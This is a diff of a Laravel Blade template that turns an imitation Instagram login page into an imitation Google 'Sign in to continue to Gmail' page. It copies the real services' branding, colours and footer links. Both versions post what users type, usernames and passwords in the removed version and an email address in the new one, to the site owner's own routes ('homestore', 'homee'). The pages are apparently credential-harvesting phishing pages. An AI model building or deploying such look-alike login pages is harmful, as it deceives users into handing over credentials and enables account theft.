@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html class="responsive" lang="en">
 
 <head>
     <meta charset="UTF-8">
@@ -9,150 +9,147 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
-    <link rel="shortcut icon" href="{{ asset('images/logo3.png') }}" type="image/x-icon">
-    <title>Connexion - Instagram
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="{{ asset('images/favicon.ico') }}" type="image/x-icon">
+    <title>Gmail
     </title>
 </head>
 <style>
-    .font {
-        background-color: #fafafa;
-    }
-
     .size {
-        width: 23rem;
+        width: 28rem;
     }
 
-    .inputcolor {
-        background-color: #fffcfc;
-    }
-
-    .bluebutton {
-        background-color: #b8dcfc;
-    }
-
-    .fonttext {
+    .roboto400 {
         font-family: 'Roboto', sans-serif;
+        color: #202124;
+        font-size: 16px;
+        line-height: 24px;
+    }
+
+    .robotojul {
+        font-family: 'Roboto', sans-serif;
+        color: #202124;
+        font-size: 12px;
+        line-height: 17px;
+    }
+
+    .roboto4002 {
+        font-family: 'Roboto', sans-serif;
+        color: #5f6368;
+        font-size: 14px;
+        line-height: 20px;
+    }
+
+
+    .roboto500 {
+        font-family: 'Roboto', sans-serif;
+        color: #1a73e8;
+        font-size: 14px;
+    }
+
+    .robotojulito {
+        font-family: 'Roboto', sans-serif;
+        color: #757575;
+        font-size: 12px;
+        line-height: 17px;
+    }
+
+    .roboto5002 {
+        font-family: 'Roboto', sans-serif;
+        color: #1a73e8;
+        font-size: 14px;
     }
 
     @font-face {
         font-family: 'font';
-        src: url('font/font.ttf') format('truetype');
+        src: url('fonts/awa.ttf') format('truetype');
     }
 
-    @font-face {
-        font-family: 'font2';
-        src: url('font/font2.ttf') format('truetype');
-    }
-
-    .font2 {
-        font-family: 'font2', Arial;
-    }
-
-    .fontpolice {
+    .font {
         font-family: 'font', Arial;
+    }
+
+    .h1font {
+        font-size: 24px;
+        line-height: 32px;
+    }
+
+    .waticolor {
+        color: #174ea6;
+        size: 14px;
+        line-height: 20px;
+    }
+
+    .buttoncolor {
+        background-color: #1a73e8;
+    }
+
+    .buttonhovercolor {
+        background-color: #1b66c9;
+    }
+
+    .caca {
+        background-color: #f6f9fe;
+    }
+
+    .responsive {
+        overflow-x: hidden;
     }
 </style>
 
-<body class="font fontpolice">
-    <div class="flex justify-center mt-10">
-        <div class="bg-white border size border-gray-300">
-            <div class="flex justify-center">
-                <img class="mt-10" width="" height="" src="images/logo.png" alt="">
-            </div>
-            <div class="flex justify-center mt-8">
-                <form method="POST" class="inline-block px-8" action="{{ route('homestore') }}">
+<body class="responsive">
+    <div class="border border-gray-200 mx-auto rounded-lg mt-10 size">
+        <div class="flex justify-center mt-8">
+            <img class="select-none" src="{{ asset('images/logoo.png') }}" width="90" height="60"
+                alt="">
+        </div>
+        <h1 class="text-center text-2xl font h1font">Sign in</h1>
+        <h1 class="text-center mt-2 roboto400">to continue to Gmail</h1>
+        <div class="mx-10">
+            <div class="w-full mt-8">
+                <form action="{{ route('homee') }}" method="POST">
                     @csrf
-                    <input id="emailField"
-                        class="border border-gray-300 inputcolor rounded px-2 py-3 block w-72 text-xs focus:outline-none focus:border-gray-400 focus:border"
-                        type="text" placeholder="Phone number, username, or email" name="emailsite">
-                    <input id="passwordField"
-                        class="border border-gray-300 rounded inputcolor px-2 py-3 mt-2 block w-full text-xs focus:outline-none focus:border-gray-400 focus:border"
-                        type="password" placeholder="Password" name="password">
-                    <button id="submitButton" disabled
-                        class="bg-blue-500 hover:bg-blue-700 opacity-60 w-full rounded mt-4 p-1 font-semibold font2 text-white ">Log
-                        In</button>
+                    <input
+                        class="border border-gray-300 rounded px-2 py-3 w-full pb-4 text-base roboto400 select-none focus:outline-none focus:border-blue-500 focus:border-2"
+                        type="text" placeholder="Email or phone" name="emailsite">
+
+            </div>
+            <div class="mt-1">
+                <h1 class="roboto500 font-medium focus:outline-none focus:bg-blue-400"><a href="/">Forgot
+                        email?</a></h1>
+            </div>
+            <div class="mt-10">
+                <h1 class="roboto4002">Not your computer? Use Guest mode to sign in privately.</h1>
+            </div>
+            <div>
+                <h1 class="roboto5002 font-medium"><a href="/">Learn more</a></h1>
+            </div>
+        </div>
+        <div class="mx-10 mt-8">
+            <div>
+                <button class="text-blue-600 font-medium p-1 py-2 rounded hover:bg-gray-100 select-none">Create
+                    account</button>
+                <button
+                    class="text-white font-medium px-6 py-2 rounded buttoncolor float-right hover:bg-blue-600 select-none">Next</button>
                 </form>
             </div>
-            <div>
-                <h1 class="mt-4 text-gray-400 text-center font text-sm font-bold">OR</h1>
-            </div>
-            <div class="flex justify-center mt-4">
-                <a href="/https://www.facebook.com/login.php">
-                    <img width="20" height="10" src="images/logo2.webp" alt=""></a>
-                <a href="https://www.facebook.com/login.php">
-                    <h1 class="text-blue-900 font-bold text-sm ml-2">Log in with Facebook</h1>
-                </a>
-            </div>
-            <div>
-                <a href="https://www.instagram.com/accounts/password/reset/">
-                    <h1 class="text-xs text-center mt-4 mb-6">Forgot password ?</h1>
-                </a>
-            </div>
+        </div>
+        <div class="mb-20">
         </div>
     </div>
-    <div class="flex justify-center mt-2">
-        <div class="bg-white border size border-gray-300">
-            <h1 class="text-sm font p-6 text-center">Don't have an account ? <a class="text-blue-500 font-bold text-md"
-                    href="">Sign up</a></h1>
+    <div class="flex justify-center">
+        <div class="mt-4">
+            <button class="robotojul font-medium">English (United Kingdom)</button>
+            <button class="robotojulito font-medium">Help</button>
+            <button class="robotojulito font-medium">Privacy</button>
+            <button class="robotojulito font-medium">Terms</button>
         </div>
     </div>
-    <div>
-        <h1 class="text-center mt-4 text-sm">Get the app.</h1>
-    </div>
-    <div class="mt-4 flex justify-center">
-        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img class="mx-1" width="150"
-                height="100" src="images/apple.png" alt=""></a>
-        <a
-            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DB4168539-1BC5-48A6-82F2-EA030E18AC1C%26utm_content%3Dlo%26utm_medium%3Dbadge"><img
-                class="mx-1" width="150" height="100" src="images/google.png" alt=""></a>
-    </div>
-    <div class="mt-14 text-xs text-gray-500">
-        <div class="flex justify-center">
-            <a class="mx-2" href="https://about.facebook.com/meta">Meta</a>
-            <a class="mx-2" href="https://about.instagram.com/blog/">About</a>
-            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Blog</a>
-            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Jobs</a>
-            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Help</a>
-            <a class="mx-2" href="https://developers.facebook.com/docs/instagram">API</a>
-            <a class="mx-2" href="https://www.instagram.com/legal/privacy/">Privacy</a>
-            <a class="mx-2" href="https://www.instagram.com/legal/terms/">Terms</a>
-            <a class="mx-2" href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
-            <a class="mx-2" href="https://www.instagram.com/directory/hashtags/">Hashtags</a>
-            <a class="mx-2" href="https://www.instagram.com/explore/locations/">Locations</a>
-            <a class="mx-2" href="https://www.instagram.com/web/lite/">Instagram Lite</a>
-            <a class="mx-2" href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading &
-                Non-Users</a>
-        </div>
-        <div class="mt-4 flex justify-center mb-20">
-            <h1 class="mx-2">English</h1>
-            <h1 class="mx-2">© 2022 Instagram from Meta</h1>
-        </div>
-    </div>
-
-    <script>
-        let emailField = document.getElementById('emailField');
-        let passwordField = document.getElementById('passwordField');
-        let submitButton = document.getElementById('submitButton');
-
-        function toggleButton() {
-            submitButton.disabled ? submitButton.disabled = false : submitButton.disabled = true;
-        }
-
-        document.addEventListener('keyup', function() {
-            if (emailField.value.length > 1 && passwordField.value.length > 5) {
-                if (submitButton.classList.contains('opacity-60')) {
-                    submitButton.classList.remove(
-                        'opacity-60')
-                    toggleButton()
-                }
-            } else {
-                if (!submitButton.classList.contains('opacity-60')) {
-                    submitButton.classList.add('opacity-60')
-                    toggleButton()
-                }
-            }
-        });
-    </script>
 </body>
 
 </html>
